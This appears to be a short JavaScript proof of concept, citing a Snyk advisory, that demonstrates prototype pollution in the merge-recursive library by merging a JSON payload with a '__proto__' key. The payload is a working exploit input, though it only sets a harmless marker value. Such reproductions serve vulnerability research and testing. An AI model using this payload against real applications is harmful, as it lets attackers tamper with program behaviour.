//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
const merge = require('merge-recursive').recursive;
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
merge({}, JSON.parse(malicious_payload));

